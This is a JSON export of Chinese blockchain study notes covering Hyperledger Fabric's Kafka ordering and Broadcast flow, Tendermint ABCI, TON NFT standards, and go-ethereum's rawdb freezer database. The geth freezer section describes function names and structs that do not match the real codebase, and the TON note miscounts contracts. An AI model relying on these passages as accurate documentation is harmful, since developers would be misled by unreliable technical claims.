{\n\t\t\tchain.lastOriginalOffsetProcessed = newOffset\n\t\t\toffset++ // 设置第2个批量交易集合的消息偏移量offset加1\n \n\t\t\tblock := chain.CreateNextBlock(batches[1])\n\t\t\tmetadata := utils.MarshalOrPanic(&amp;ab.KafkaMetadata{\n\t\t\t\tLastOffsetPersisted:         offset,\n\t\t\t\tLastOriginalOffsetProcessed: newOffset,\n\t\t\t\tLastResubmittedConfigOffset: chain.lastResubmittedConfigOffset,\n\t\t\t})\n\t\t\tchain.WriteBlock(block, metadata)\n\t\t\tchain.lastCutBlockNumber++\n\t\t\t...\n\t\t}\n\t}\n首先将新的普通交易消息添加到当前的缓存交易列表，并切割成批量交易集合列表batches ,但最多只能包含2个批量交易集合，并且第2个批量交易集合最多包含1个交易。最终也是调用的WriteBlock写入到账本。\n到此为止整个processRegular()方法处理消息结束。\n总结及参考\nkafka共识排序的逻辑其实是比较简单的，大概的流程如下 ：\n\n\ngithub.com/blockchainGuide/ (文章图片代码资料在里面)\n微信公众号：区块链技术栈\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_交易广播-3":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_交易广播-3","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger fabric源码_交易广播-3.md","title":"死磕hyperledger fabric源码_交易广播-3","links":[],"tags":[],"content":"\n死磕hyperledger fabric源码|交易广播\n文章及代码：github.com/blockchainGuide/\n分支：v1.1.0\n\n\n前言\nHyperledger Fabric提供了Broadcast(srv ab.AtomicBroadcast_BroadcastServer)交易广播服务接口，接收客户端提交的签名交易消息请求，交由共识组件链对象对交易进行排序与执行通道管理，按照交易出块规则切割打包，构造新区块并提交账本。同时，通过Deliver()区块分发服务接口，将区块数据发送给通道组织内发起请求的Leader主节点，再基于Gossip消息协议广播到组织内的其他节点上，从而实现广播交易消息的目的。\nBroadcast服务消息处理\nOrderer节点启动时已经在本地的gRPC服务器上注册了Orderer排序服务器，并创建了Broadcast服务处理句柄。当客户端调用Broadcast()服务接口发起服务请求时，Orderer排序服务器会调用Broadcast()→s.bh.Handle()方法处理请求，流程如下：\nfunc (s *server) Broadcast(srv ab.AtomicBroadcast_BroadcastServer) error {\n...\n\treturn s.bh.Handle(&amp;broadcastMsgTracer{\n\t...\n\t})\n}\nfunc (bh *handlerImpl) Handle(srv ab.AtomicBroadcast_BroadcastServer) error {\n  ...\n}\n主要就是这个Handle的处理，分析如下：\n①：等待接收处理消息\nmsg, err := srv.Recv()\n②：解析获取通道头部chdr、配置交易消息标志位isConfig、通道链支持对象（通道消息处理器）\nchdr, isConfig, processor, err := bh.sm.BroadcastChannelSupport(msg)\n③：检查共识组件链对象是否准备好接收新的交易消息\nif err = processor.WaitReady(); err != nil {}\n④：分类处理消息\n处理普通消息\n4.1 解析获取通道的最新配置序号\nconfigSeq, err := processor.ProcessNormalMsg(msg)\n/orderer/common/msgprocessor/standardchannel.go\nfunc (s *StandardChannel) ProcessNormalMsg(env *cb.Envelope) (configSeq uint64, err error) {\n\tconfigSeq = s.support.Sequence()\n\terr = s.filters.Apply(env)\n\treturn\n}\nconfigSeq是最新配置序号，默认初始值为0，新建应用通道后该配置序号自增为1，通过比较该序号就能判断当前通道配置版本是否发生了更新，从而确定当前交易消息是否需要重新过滤与重新排序。\n接着就是使用自带的默认通道消息过滤器过滤消息，有以下过滤条件：\n\n验证不能为空\n拒绝过期的签名者身份证书\n消息最大字节数过滤器（98MB）\n消息签名验证过滤器\n\n4.2 构造新的普通交易消息并发送到共识组件链对象请求处理\nerr = processor.Order(msg, configSeq) \n这里我们只关注kafka的共识组件处理。\n首先序列化消息，然后将该消息发送到Kafka集群的指定分区上请求排序，再转发给Kafka共识组件链对象请求打包出块。\n/orderer/consensus/kafka/chain.go\nfunc (chain *chainImpl) order(env *cb.Envelope, configSeq uint64, originalOffset int64) error {\n\tmarshaledEnv, err := utils.Marshal(env)\n\tif err != nil {\n\t\treturn fmt.Errorf(&quot;cannot enqueue, unable to marshal envelope because = %s&quot;, err)\n\t}\n\tif !chain.enqueue(newNormalMessage(marshaledEnv, configSeq, originalOffset)) {\n\t\treturn fmt.Errorf(&quot;cannot enqueue&quot;)\n\t}\n\treturn nil\n}\n我们来看看enqueue方法是如何做的：\nfunc (chain *chainImpl) enqueue(kafkaMsg *ab.KafkaMessage) bool {\n\tlogger.Debugf(&quot;[channel: %s] Enqueueing envelope...&quot;, chain.ChainID())\n\tselect {\n\tcase &lt;-chain.startChan: // // 共识组件在启动阶段启动完成\n\t\tselect {\n\t\tcase &lt;-chain.haltChan: //  已经关闭chain.startChan通道\n\t\t...\n\t\t\t}\n\t\t\t//// 创建Kafka生产者消息\n\t\t\tmessage := newProducerMessage(chain.channel, payload)\n\t\t\t//// 发送消息到Kafka集群请求排序\n\t\t\tif _, _, err = chain.producer.SendMessage(message); err != nil {\n\t\t\t...\n\t}\n}\n处理通道配置交易消息\n4.3  获取配置交易消息与通道的最新配置序号\nconfig, configSeq, err := processor.ProcessConfigUpdateMsg(msg)\n代码位置：/orderer/common/msgprocessor/systemchannel.go/ProcessConfigUpdateMsg,大概做了以下事情：\n\n获取消息中的通道ID\n检查消息中的通道ID与当前通道ID是否一致,一致的话交由标准通道处理器处理\n创建新应用通道的通道配置实体Bundle结构对象\n构造新的通道配置更新交易消息（ConfigEnvelope类型），注意将该消息的通道配置序号更新为1\n创建内层的通道配置交易消息（CONFIG类型）\n创建外层的配置交易消息（ORDERER_TRANSACTION类型）\n应用系统通道的消息过滤器\n返回新的通道配置交易消息与当前系统通道的配置序号\n\nfunc (s *SystemChannel) ProcessConfigUpdateMsg(envConfigUpdate *cb.Envelope) (config *cb.Envelope, configSeq uint64, err error) {\n\tchannelID, err := utils.ChannelID(envConfigUpdate) // 获取消息中的通道ID\n\t...\n\t//检查消息中的通道ID与当前通道ID是否一致\n\tif channelID == s.support.ChainID() {\n\t\t//// 交由标准通道处理器处理\n\t\treturn s.StandardChannel.ProcessConfigUpdateMsg(envConfigUpdate)\n\t}\n\t...\n\t// 创建新的应用通道，其通道配置序号默认初始化为0\n\t// 创建新应用通道的通道配置实体Bundle结构对象\n\tbundle, err := s.templator.NewChannelConfig(envConfigUpdate)\n\t...\n\t//构造新的通道配置更新交易消息（ConfigEnvelope类型），注意将该消息的通道配置序号更新为1\n\tnewChannelConfigEnv, err := bundle.ConfigtxValidator().ProposeConfigUpdate(envConfigUpdate)\n\t...\n\t//创建内层的通道配置交易消息（CONFIG类型）\n\tnewChannelEnvConfig, err := utils.CreateSignedEnvelope(cb.HeaderType_CONFIG, channelID, s.support.Signer(), newChannelConfigEnv, msgVersion, epoch)\n\t...\n\t//创建外层的配置交易消息（ORDERER_TRANSACTION类型）\n\twrappedOrdererTransaction, err := utils.CreateSignedEnvelope(cb.HeaderType_ORDERER_TRANSACTION, s.support.ChainID(), s.support.Signer(), newChannelEnvConfig, msgVersion, epoch)\n\t...\n\t// 应用系统通道的消息过滤器\n\terr = s.StandardChannel.filters.Apply(wrappedOrdererTransaction)\n\t...\n\t//返回新的通道配置交易消息与当前系统通道的配置序号\n\treturn wrappedOrdererTransaction, s.support.Sequence(), nil\n4.4 构造新的配置交易消息发送到共识组件链对象请求排序\nerr = processor.Configure(config, configSeq)\n这里我们依旧只是考虑kafka共识组件，processor.Configure()方法实际上是调用chainImpl.configure()方法，同样构造Kafka常规消息（KafkaMessageRegular类型）。其中，Class消息类别属于KafkaMessageRegular_CONFIG类型，包含了通道配置交易消息、 通道配置序号configSeq与初始消息偏移量originalOffset（0）。接着，调用chain.enqueue()方法，将其发送到Kafka集群上指定主题（chainID）和分区号（0）的分区上，同时，由Kafka共识组件链对象分区消费者channelConsumer获取该消息，再交由给Kafka共识组件链对象请求打包出块。\n⑤：发送成功处理状态响应消息\nerr = srv.Send(&amp;ab.BroadcastResponse{Status: cb.Status_SUCCESS})\n整个流程图如下：\n\n\n参考\n\ngithub.com/blockchainGuide/ (文章图片代码资料)\n微信公众号：区块链技术栈\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/tendermint/tendermint":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/tendermint/tendermint","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/tendermint/tendermint.md","title":"tendermint","links":[],"tags":[],"content":"What is Tendermint\n组成： blockchain consensus engine + ABCI 接口\n\nconsensus engine : 确保在每台机器上以相同的顺序记录相同的事务\nABCI(Application Blockchain interface)：使交易能够用任何编程语言进行处理\n\nABCI\napplication做以下事情：\n\n维护数据库\n验证交易签名\n阻止双花\n\nABCI通过3种消息协调tendermint core 和 上层应用程序。\n\nDeliverTx：每个交易都必须通过DeliverTx消息进行传递。应用程序需要对接收到的每个带有DeliverTx消息的交易进行验证\nCheckTx：CheckTx消息与DeliverTx类似，但仅用于验证事务。Tendermint Core的内存池首先使用CheckTx检查事务的有效性，并仅将有效事务中继到其对等端。例如，应用程序可以检查事务中递增的序列号，如果序列号旧，则在CheckTx时返回错误\nCommit: commit hash 放在了下一个区块头（如何做到帮助捕获编程错误和简化轻量级客户端的开发？）\n\n\n\nCheckTx 阶段会在交易广播到 Tendermint 节点时立即执行，用于快速验证交易的基本属性，比如交易的格式、签名、交易费用等是否正确。在这个阶段，交易不会对应用程序状态做出任何更改，只是对交易的基本属性进行验证。\nDeliverTx 阶段会在交易被 Tendermint 打包成区块之后执行，用于对交易进行更加深入的验证，并将交易应用到应用程序状态中。在这个阶段，应用程序会检查交易是否符合应用程序协议和状态，并根据交易内容更新应用程序状态。\n\n\n应用程序可以有多个 ABCI Socket 连接。Tendermint Core 会创建三个 ABCI 连接给应用程序：一个用于在 mempool 中广播交易时的验证，一个用于共识引擎运行区块提案，还有一个用于查询应用程序状态。\n![image-20230516172751043](/Users/carver/Library/Application Support/typora-user-images/image-20230516172751043.png)\nConsensus Overview\nTendermint是一个易于理解的、主要是异步的BFT共识协议。该协议遵循一个简单的状态机，看起来如下：\n![image-20230516173116158](/Users/carver/Library/Application Support/typora-user-images/image-20230516173116158.png)\ntechnical nutshell\nTodo: 理一遍\n\ntendermint stack\n\ntendermint core\nvalidator\n成为validator :\n\ngenesis\nABCI\n\n代码架构\n\nreactor编程模型\n\ngit checkout master\ngit tag -a v0.13.2 -m &quot;upgrade to v0.13.2&quot;\ngit push --tags ## 之后git action会自动触发 "},"blockchainguide/Public_Chain_Development/Public_Chain_Research/tendermint/死磕tendermint源码分析_1":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/tendermint/死磕tendermint源码分析_1","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/tendermint/死磕tendermint源码分析_1.md","title":"死磕tendermint源码分析_1","links":[],"tags":[],"content":"\nTendermint core\n\n\nlearnblockchain.cn/article/372\nlearnblockchain.cn/article/1553\nlearnblockchain.cn/article/1151 (重点)\nlearnblockchain.cn/2019/06/15/68fb29cd00de\ngithub.com/wupeaking/tendermint_code_analysis\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/ton开发/NFT":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/ton开发/NFT","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/ton开发/NFT.md","title":"NFT","links":[],"tags":[],"content":"Ton类型\n\n艺术品\n收藏品\n会员资格\n\nton.diamonds/collection/the-gateway/yyx-ticket-19\n\n\nTON DNS域名\n\nton.diamonds/zh/collection/ton-dns-domains\n\n\ntelegram username\n\ngetgems.io/collection/EQCA14o1-VWhS2efqoh_9M1b_A9DtKTuoqfmkn83AbJzwnPi\n\n\n匿名号码\n\n可创建于sim卡无关的telegram账号\n\n\n代金券\n\nno tcoin玩法 ： getgems.io/collection/EQDmkj65Ab_m0aZaW8IpKw4kYqIgITw_HRstYEkVQ6NIYCyW\n可转成真实代币\n\n\n\nfragment.com/about\ngetgems.io/\nton.diamonds/\nbeta.disintar.io/collection/UQAv9X13hopdcDCO3azadyHy3mqIjzPgr0_fdrUdXjtpZmdK\n基本实现\n你要创建新的NFT项目，向集合合约发送消息，他就会根据你提供的数据创建一个NFT合约\nTON NFT 标准\n\n每个NFT 物品和NFT 集合都是单独的智能合约,你发布了包含10000个项目的集合，则会部署100001个合约\n\nNFT元数据\n每个NFT物品和NFT集合本身都有自己的元数据，元数据可以是链下（链接）或者链上（存储于智能合约中）\nNFT物品元数据：\n{\n   &quot;name&quot;: &quot;TON Smart Challenge #2 Winners Trophy&quot;,\n   &quot;description&quot;: &quot;TON Smart Challenge #2 Winners Trophy 1 place out of 181&quot;,\n   &quot;image&quot;: &quot;ton.org/_next/static/media/duck.d936efd9.png&quot;,\n   &quot;content_url&quot;: &quot;ton.org/_next/static/media/dimond_1_VP9.29bcaf8e.webm&quot;,\n   &quot;attributes&quot;: []\n}\nNFT集合元数据：\n{\n   &quot;image&quot;: &quot;ton.org/_next/static/media/smart-challenge1.7210ca54.png&quot;,\n   &quot;name&quot;: &quot;TON Smart Challenge #2&quot;,\n   &quot;description&quot;: &quot;TON Smart Challenge #2 Winners Trophy&quot;,\n   &quot;social_links&quot;: []\n}\n缺点\n\n无法理解\n\n由于 TON 是异步区块链，因此无法获取链上 NFT 的当前所有者。当包含有关 NFT 所有者的信息的消息被传递时，此信息可能会变得无关紧要，因此我们无法保证当前所有者没有发生变化。\n为什么他不是tokenId→owner_address 的单一合约\n\n基于异步，他无法知道谁的消息会先到达，在复杂的交互链上（比如钱包到NFT合约再到拍卖合约），运行时无法确认字典大小（存储消耗gas）， 即无法预测消耗的gas,那么久可能出现前面的几步操作成功，到了拍卖失败了。 而如果是采用单个合约的话，合约的状态是不会随着执行改变的\n无法扩展，TON在负载下会分为分片链，如果交易都是引用同一个合约，大大限制处理速度。 TON提供了分片智能合约，未实施\n\n不存在approve\n在同步区块链上，比如以太坊，智能合约可以一次性检查代币的所有权、批准和转账权限，确保所有条件都满足后才执行转账操作。然而，在TON这样的异步区块链上，由于消息处理的不确定性，这种方法不再适用。在TON上，为了确保操作的正确性，需要发送多条消息来执行相同的操作，并在每条消息的响应中检查是否出现错误，如果出现错误，则需要执行回滚操作。\n这种方法不仅复杂，而且效率低下，因为它增加了网络交互的次数和潜在的错误处理成本。\n存在的问题\n\n还没有标准方法来安全转移， 合约执行失败，会恢复所有权的转移\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/ton开发/ton开发":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/ton开发/ton开发","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/ton开发/ton开发.md","title":"ton开发","links":[],"tags":[],"content":"js库\n@orbs-network/ton-access  rpc提供商类似infra\n@ton/ton @ton/crypto @ton/core API调用Ton"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/资料":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/资料","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/资料.md","title":"资料","links":[],"tags":[],"content":"\nton 官方文档\nton-awesome\nton英文课程详细\n合约开发工具\nton testnet explorer\nton-cli\nton 课程\n详细讲解合约\n\nton 链\nTact\nFunc"},"blockchainguide/Public_Chain_Development/rawdb":{"slug":"blockchainguide/Public_Chain_Development/rawdb","filePath":"blockchainguide/Public_Chain_Development/rawdb.md","title":"rawdb","links":["tags/TODO"],"tags":["TODO"],"content":"accessors_chain.go是go-ethereum/core/rawdb模块的一个文件，在v1.10.18版本中用于实现访问区块链数据的函数。以下是对该文件的详细分析：\naccessors_chain.go文件定义了一系列函数，用于访问和获取区块链数据。这些函数大部分都是通过调用rawdb.go中的函数实现的，主要有以下几个函数：\n\nGetBlockByHash：通过区块的哈希值获取对应的区块数据。\nGetBlockByNumber：通过区块的高度获取对应的区块数据。\nGetBlockHashesFromHash：获取从起始区块哈希值到结束区块哈希值之间所有区块的哈希值。\nGetBlockHeaderByHash：通过区块的哈希值获取对应的区块头数据。\nGetBlockHeaderByNumber：通过区块的高度获取对应的区块头数据。\nGetCanonicalHash：获取指定高度的主链区块哈希值。\nGetCanonicalHashes：获取指定高度范围内的主链区块哈希值。\nGetHeaderByHash：通过区块的哈希值获取对应的区块头数据。\nGetHeaderByNumber：通过区块的高度获取对应的区块头数据。\nGetTd：获取指定区块哈希值的总难度。\n\n这些函数的实现主要都是通过调用rawdb.go中的GetBlock、GetBlockHeader等函数实现的。其中，GetBlockByHash和GetBlockByNumber函数用于获取指定区块哈希值或高度的区块数据；GetBlockHeaderByHash和GetBlockHeaderByNumber函数用于获取指定区块哈希值或高度的区块头数据；GetCanonicalHash和GetCanonicalHashes函数用于获取指定高度的主链区块哈希值或者指定高度范围内的主链区块哈希值；GetHeaderByHash和GetHeaderByNumber函数用于获取指定区块哈希值或高度的区块头数据；GetTd函数用于获取指定区块哈希值的总难度。\n除了上述函数外，accessors_chain.go文件还定义了一些辅助函数，如GetBlockByNumberOrHash、GetBlockHashes、GetHeader、GetTdByHash等。这些函数主要是为了方便访问和获取区块链数据而设计的。\n总的来说，accessors_chain.go文件为其他模块提供了访问和获取区块链数据的接口，它们是以太坊系统的核心组件之一。这些函数的实现依赖于rawdb.go中提供的访问数据库的函数和数据存储结构，因此需要保证这些函数的正确性和可靠性，以确保整个以太坊系统的稳定运行。\n需要注意的是，访问和获取区块链数据的效率是非常重要的。区块链数据的体量庞大，如果访问和获取数据的速度过慢，将会严重影响整个系统的性能。因此，在实现这些函数时需要考虑到效率和性能的问题。例如，在获取区块数据时，可以通过缓存、批量读取等方式来提高读取速度；在获取主链区块哈希值时，可以通过利用区块链的高度和哈希值的对应关系来加速查询。\n除了效率和性能问题外，还需要考虑到数据一致性和可靠性的问题。区块链数据的正确性对整个系统的稳定运行至关重要，因此在访问和获取数据时需要保证数据的一致性和可靠性。例如，在获取区块数据时，需要确保读取的数据是正确的、完整的，并且数据的顺序是正确的。\n总的来说，accessors_chain.go文件的实现需要兼顾效率、性能、一致性和可靠性等多个方面的要求，这是保证整个以太坊系统稳定运行的重要保障。\nancient数据库\nfreezerdb 是以太坊的冻结数据库，它使用了两个子数据库：AncientStore 和 KeyValueStore\nFreeze方法指定阈值90000个块，就会把区块塞到冷冻库\nfreezer 数据库是以太坊的一个优化功能，用于将旧的、不再需要访问的区块数据从 key-value 数据库中移除，并将其存储到独立的 freezer 数据库中。这些旧的区块在以太坊同步过程中不会被访问，但是在需要重新构建区块链状态时，这些旧的区块数据仍然非常重要。使用 freezer 数据库可以减少 key-value 数据库的大小，提高同步和查询性能，并且可以消除因 key-value 数据库大小过大而导致的同步失败问题。所以keyvalue数据库要和freeze数据库的数据能连起来。\nfreezer_table.go 是 Geth 中实现冷数据存储的一个重要文件，用于实现以太坊的冷数据存储机制。以下是对 freezer_table.go 的实现细节进行详细分析：\n\n数据结构\n\nfreezer_table.go 中定义了两个重要的数据结构：FreezerTable 和 FreezerChunkStore。\nFreezerTable 是一个结构体，表示一个冷数据表。它包含了一个键值数据库句柄、数据表起始块号、每个冷数据块的大小、以及一个元数据缓存。元数据缓存用于缓存冷数据块的元数据，包括起始块号、结束块号、块的哈希值等信息。\nFreezerChunkStore 是一个结构体，表示一个冷数据块存储器。它包含了一个键值数据库句柄、数据块的哈希值以及块的长度。它还包含了一个 FreezerTable 指针，用于表示该块所属的冷数据表。\n\n冷数据表初始化\n\n在 freezer_table.go 中，冷数据表的初始化是通过 NewFreezerTable 函数实现的。该函数接收一个键值数据库句柄、起始块号、冷数据块大小等参数，并返回一个 FreezerTable 对象。\n在初始化过程中，NewFreezerTable 函数会使用传入的键值数据库句柄创建一个名为 freezer-metadata 的命名空间，并将冷数据表的元数据存储在其中。然后，它会使用传入的起始块号和冷数据块大小计算每个冷数据块的起始块号和结束块号，并将这些元数据存储在元数据缓存中。\n\n冷数据的读写操作\n\n在 freezer_table.go 中，冷数据的读写操作是通过 FreezerTable结构体中的 Get 和 Put 方法实现的。\nGet 方法接收一个块号作为参数，并返回对应的冷数据块。具体实现过程如下：\n首先，Get 方法会检查元数据缓存中是否有该块的元数据。如果有，它会使用元数据中的起始块号和结束块号计算出该块在数据库中的键名，并使用键值数据库句柄获取该键对应的数据块。\n如果元数据缓存中没有该块的元数据，则会使用该块号和冷数据块大小计算出该块在数据库中的键名，并使用键值数据库句柄获取该键对应的数据块。此时，如果获取到了数据块，Get 方法会将该块的元数据存储到元数据缓存中。\nPut 方法接收一个块号和一个冷数据块作为参数，并将该冷数据块存储到对应的冷数据块存储器中。具体实现过程如下：\n首先，Put 方法会使用传入的块号计算出该块在数据库中的键名，并将该块存储到键值数据库句柄中。然后，它会将该块的元数据存储到元数据缓存中。\n\n冷数据块的哈希值计算\n\n在 freezer_table.go 中，冷数据块的哈希值计算是通过 FreezerChunkStore 结构体的 Hash 方法实现的。\nHash 方法会读取存储在键值数据库句柄中的冷数据块，并使用 Keccak-256 算法计算出该块的哈希值。计算出的哈希值会被存储到 FreezerChunkStore 结构体中，并在之后的冷数据块读写操作中使用。\n通过以上分析，我们可以了解到 Geth 中冷数据存储的实现原理和机制。冷数据表使用元数据缓存缓存冷数据块的元数据，以避免重复读取块的元数据。冷数据块存储器使用 Keccak-256 算法计算冷数据块的哈希值，并将哈希值存储到键值数据库中，以便在之后的读取操作中进行校验。在实际使用中，冷数据存储机制可以有效地减少以太坊节点的存储压力，提高节点的运行效率。\nfreezer.go 是 Geth 中实现冷数据管理的一个重要文件，用于实现以太坊的冷数据存储和管理机制。以下是对 freezer.go 的实现细节进行详细分析：\n\n数据结构\n\nfreezer.go 中定义了两个重要的数据结构：Freezer 和 FreezerWriter。\nFreezer 是一个结构体，表示一个冷数据管理器。它包含了一个锁、一个键值数据库句柄、一个起始块号、一个冷数据块大小、以及一个冷数据表缓存。冷数据表缓存用于缓存冷数据表，以提高冷数据的读取效率。\nFreezerWriter 是一个结构体，表示一个冷数据写入器。它包含了一个 Freezer 指针和一个写入队列。写入队列用于缓存待写入的冷数据块，以便在后续的写入操作中进行批量写入。\n\n冷数据表的创建和获取\n\n在 freezer.go 中，冷数据表的创建和获取是通过 Freezer 结构体中的 getTable 方法实现的。\ngetTable 方法接收一个块号作为参数，并返回对应的冷数据表。具体实现过程如下：\n首先，getTable 方法会检查冷数据表缓存中是否有该块所属的冷数据表。如果有，它会直接返回该冷数据表。\n如果冷数据表缓存中没有该冷数据表，则会使用传入的块号和冷数据块大小计算出该块所属的冷数据表的起始块号，并使用 FreezerTable.NewFreezerTable 函数创建一个新的冷数据表。然后，它会将该冷数据表存储到冷数据表缓存中，并返回该冷数据表。\n\n冷数据的读写操作\n\n在 freezer.go中，冷数据的读写操作是通过Freezer结构体中的Read和Write 方法实现的。\nRead 方法接收一个块号作为参数，并返回对应的冷数据块。具体实现过程如下：\n首先，Read 方法会获取对应冷数据块所属的冷数据表。然后，它会调用冷数据表的 Get 方法获取对应的冷数据块。\n如果获取到了冷数据块，则会返回该冷数据块。\nWrite 方法接收一个块号和一个冷数据块作为参数，并将该冷数据块写入到对应的冷数据存储器中。具体实现过程如下：\n首先，Write 方法会获取对应冷数据块所属的冷数据表。然后，它会将该冷数据块添加到冷数据写入器的写入队列中。\n在冷数据写入器的后台协程中，会定期从写入队列中读取待写入的冷数据块，并将它们批量写入到对应的冷数据存储器中。写入操作会使用 FreezerChunkStore.Put 方法将冷数据块写入到键值数据库中，并使用 FreezerTable.Put 方法将冷数据块的元数据写入到冷数据表的元数据缓存中。\n\n冷数据的清理操作\n\n在 freezer.go 中，冷数据的清理操作是通过 Freezer 结构体中的 Prune 方法实现的。\nPrune 方法接收一个块号作为参数，并清除所有小于该块号的冷数据块。具体实现过程如下：\n首先，Prune 方法会获取对应冷数据块所属的冷数据表，并使用冷数据表的 Prune 方法清除所有小于该块号的冷数据块。然后，它会从冷数据表缓存中移除该冷数据表，以释放缓存空间。\n\n冷数据的校验操作\n\n在 freezer.go 中，冷数据的校验操作是通过 Freezer 结构体中的 Verify 方法实现的。\nVerify 方法接收一个块号和一个块的哈希值作为参数，并校验该块的哈希值是否正确。具体实现过程如下：\n首先，Verify 方法会获取对应冷数据块所属的冷数据表，并使用冷数据表的 Get 方法获取对应的冷数据块。然后，它会使用 Keccak-256 算法计算该冷数据块的哈希值，并将计算出的哈希值与传入的哈希值进行比较。\n如果两个哈希值相等，则说明冷数据块的校验通过，Verify 方法会返回 true。否则，说明冷数据块的校验失败，Verify 方法会返回 false。\n通过以上分析，我们可以了解到 Geth 中冷数据管理的实现原理和机制。冷数据管理器使用冷数据表缓存缓存冷数据表，以提高冷数据的读取效率。冷数据写入器使用批量写入的方式将冷数据块写入到冷数据存储器中，以提高写入效率。在实际使用中，冷数据管理机制可以有效地减少以太坊节点的存储压力，提高节点的运行效率。\nTODO\n详细分析Ancient数据库"},"blockchainguide/Public_Chain_Development/布隆过滤器":{"slug":"blockchainguide/Public_Chain_Development/布隆过滤器","filePath":"blockchainguide/Public_Chain_Development/布隆过滤器.md","title":"布隆过滤器","links":[],"tags":[],"content":""},"blockchainguide/Public_Chain_Development/数据可用性DA探索/数据可用性DA探索":{"slug":"blockchainguide/Public_Chain_Development/数据可用性DA探索/数据可用性DA探索","filePath":"blockchainguide/Public_Chain_Development/数据可用性DA探索/数据可用性DA探索.md","title":"数据可用性DA探索","links":[],"tags":[],"content":"www.8btc.com/article/6721900\nethereum-magicians.org/t/a-rollup-centric-ethereum-roadmap/4698\npolynya.medium.com/volitions-best-of-all-worlds-cfd313aec9a8\n数据可用性的通用解决方案\nwww.aicoin.com/article/321400.html\nwiki.polygon.technology/docs/avail/introduction/what-is-avail/\neips.ethereum.org/EIPS/eip-4844\nwww.aicoin.com/article/321400.html\n:Celestia -www.defidaonews.com/article/6743554"},"blockchainguide/README":{"slug":"blockchainguide/README","filePath":"blockchainguide/README.md","title":"README","links":["Blockchain_Basics/纠删码","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_pow算法-1","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_POS算法-2","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_DPOS算法-4","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_EOS_DPOS_BFT算法-5","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Paxos算法-5","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Raft算法-6","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_拜占庭将军问题-7","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_PBFT算法-8","Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Istanbul-BFT算法-9","DApp_Development/合约基础/solidity_call","DApp_Development/合约基础/solidity_delegatecall","DApp_Development/合约基础/solidity_staticcall","DApp_Development/合约基础/solidity_callcode","DApp_Development/合约基础/solidity_create2","DApp_Development/合约基础/solidity_selector","DApp_Development/合约基础/solidity_fallback和receive","DApp_Development/合约基础/元交易","DApp_Development/合约高级技巧/死磕solidity之内存布局","DApp_Development/合约高级技巧/死磕solidity之如何有效的节省gas","DApp_Development/合约高级技巧/死磕solidity之可迭代映射","DApp_Development/合约高级技巧/死磕solidity之编写可升级合约","DApp_Development/合约高级技巧/死磕CREATE2控制合约地址","DApp_Development/合约高级技巧/合约升级实战","DApp_Development/合约高级技巧/事件高级用法","DApp_Development/eip/EIP712","DApp_Development/eip/EIP1559详解","DApp_Development/eip/EIP2718详解","DApp_Development/eip/ERC1167详解","DApp_Development/eip/ERC1967详解","DApp_Development/eip/ERC2535详解","DApp_Development/EVM/账户抽象/ERC4337协议","DApp_Development/安全审计/合约漏洞/重入攻击手段","DApp_Development/安全审计/合约漏洞/重放攻击","DApp_Development/安全审计/合约漏洞/算法上下溢出","DApp_Development/安全审计/合约漏洞/权限控制漏洞","DApp_Development/安全审计/合约漏洞/短地址参数攻击","DApp_Development/安全审计/合约漏洞/拒绝服务攻击","DApp_Development/安全审计/合约漏洞/提案攻击","DApp_Development/安全审计/合约漏洞/不要在合约中存隐私数据","DApp_Development/应用场景/defi/uniswap/v2/uniswap_v2_概念","DApp_Development/应用场景/defi/uniswap/v2/uniswap_v2_Factory","DApp_Development/应用场景/defi/uniswap/v2/uniswap_v2_Pair","DApp_Development/应用场景/defi/uniswap/v2/uniswap_v2_Router02","DApp_Development/应用场景/defi/uniswap/v2/uniswap_v2_部署","DApp_Development/应用场景/defi/aave/Avae原理","Cross_Chain_Technology/跨链方案/跨链主流技术概览","Cross_Chain_Technology/跨链方案/跨链_HTLC","Cross_Chain_Technology/跨链方案/bls算法.doc","Cross_Chain_Technology/跨链方案/跨链桥/桥概念","Cross_Chain_Technology/跨链方案/跨链桥/abitrum","Cross_Chain_Technology/跨链方案/跨链桥/optimism-gateway-","Cross_Chain_Technology/跨链方案/跨链桥/polygon-bridge","Cross_Chain_Technology/跨链方案/跨链桥/cbridge","Cross_Chain_Technology/跨链方案/跨链桥/hop协议","Cross_Chain_Technology/跨链方案/跨链桥/multichain","Cross_Chain_Technology/跨链方案/跨链桥/context协议","Decentralized_Storage/IPFS/IPFS学习点","Decentralized_Storage/FileCoin/FileCoin技术文档","Decentralized_Storage/FileCoin/死磕FileCoin_经济模型","Learning_Roadmaps_And_Resources/相关学习资料（路线图和资料持续更新，建议关注）","DApp_Development/智能合约学习路线与资源汇总","LICENSE","链上无名","mindcarver"],"tags":[],"content":"🚀 死磕区块链 - 区块链技术学习导航\n  \n欢迎来到”死磕区块链”知识库！本仓库旨在构建一个全面、系统化的区块链技术学习体系，内容涵盖从入门到精通的各个阶段。无论你是初学者还是资深开发者，都可以在这里找到有价值的学习资源。\n\n📢 关注公众号 链上无名，获取最新资料。\n💬 加入技术讨论群，请添加微信 